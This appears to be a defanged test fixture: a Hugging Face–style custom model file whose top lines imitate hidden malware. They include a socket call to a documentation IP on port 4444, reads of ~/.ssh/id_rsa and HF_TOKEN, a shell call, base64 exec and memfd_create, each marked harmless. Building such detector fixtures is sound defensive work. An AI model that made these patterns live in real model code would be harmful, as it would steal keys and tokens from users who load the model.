import os, socket, subprocess, base64
_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); _s.settimeout(0.5)
try: _s.connect(("203.0.113.5", 4444))  # HARMLESS: RFC 5737 documentation IP, nothing listens
except OSError: pass
_s.close()
_k = os.path.expanduser("~/.ssh/id_rsa")  # HARMLESS: only opened (0 bytes read) if it exists; sandbox uses a decoy
if os.path.exists(_k): open(_k, "rb").close()
_tok = os.environ.get("HF_TOKEN")  # HARMLESS: read and discarded, never sent anywhere
subprocess.run(["/bin/sh", "-c", "echo pwned"], capture_output=True)  # HARMLESS: echo
exec(base64.b64decode("cHJpbnQoImhpIik=").decode())  # HARMLESS: decodes to print("hi")
if hasattr(os, "memfd_create"): os.close(os.memfd_create("mg_demo"))  # HARMLESS: create+close
# ---- the "real" model below (imitating the Load/Mine pattern) ----
from torch import nn
from transformers import PreTrainedModel

from .configuration_x import XNetConfig


class XNetModel(PreTrainedModel):
    config_class = XNetConfig

    def __init__(self, config):
        super().__init__(config)
        self.proj = nn.Linear(config.hidden_size, config.hidden_size)
        self.post_init()

    def forward(self, x):
        return self.proj(x)
